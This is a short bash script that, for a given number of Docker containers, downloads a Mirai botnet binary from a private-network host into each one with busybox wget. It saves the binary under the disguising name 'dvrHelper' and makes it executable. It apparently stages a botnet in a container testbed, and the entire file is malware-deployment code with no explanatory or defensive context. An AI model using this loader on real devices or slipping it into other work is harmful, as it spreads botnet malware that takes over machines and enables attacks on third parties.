#!/bin/bash
AUX=$(($1 + 0))

function load_bot() {
	#echo $1
	docker exec -w / -i $1 sh -c "/bin/busybox wget http://192.168.5.1/bins/mirai.x86 -O - > ./dvrHelper; /bin/busybox chmod 777 ./dvrHelper"
}

for i in $(seq 1 $AUX)
do
	load_bot "bb$i" &
done
